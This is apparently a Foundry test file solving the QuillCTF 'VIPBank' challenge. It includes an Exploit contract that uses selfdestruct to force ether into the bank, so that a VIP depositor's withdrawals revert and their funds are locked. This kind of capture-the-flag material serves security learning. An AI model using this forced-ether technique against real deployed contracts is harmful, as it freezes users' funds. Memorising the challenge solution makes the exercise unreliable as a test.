// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/VIPBank.sol";

contract VIPBankTest is Test {
    VIPBank public bank;
    Exploit public exploit;
    address public deployer;
    address public attacker;
    address public victim;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);
        victim = vm.addr(3);
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        vm.deal(victim, 1 ether);

        vm.startPrank(deployer);
        bank = new VIPBank();
        bank.addVIP(victim);
        vm.stopPrank();

        vm.startPrank(victim);
        assertEq(bank.contractBalance(), 0);
        bank.deposit{value: 0.05 ether}();
        assertEq(bank.contractBalance(), 0.05 ether);
        vm.stopPrank();
    }

    function testVIPBankWithdraw() public {
        assertEq(victim.balance, 0.95 ether);

        vm.prank(victim);
        bank.withdraw(0.05 ether); // check if the withdraw function works

        assertEq(bank.contractBalance(), 0);
        assertEq(victim.balance, 1 ether);
    }

    function testVIPBankExploit() public {
        vm.prank(attacker);
        exploit = new Exploit{value: 0.5 ether}(address(bank)); // exploit contract by selfdestruct, make VIPBank balance equal to 0.5 ether

        vm.startPrank(victim);
        vm.expectRevert("Cannot withdraw more than 0.5 ETH per transaction"); // check if the exploit worked
        bank.withdraw(0.05 ether); // should revert as the exploit has already make VIPBank balance to 0.5 ether 
        vm.stopPrank();
    }
}

contract Exploit {
    constructor(address _address) payable {
        selfdestruct(payable(_address));
    }
}
 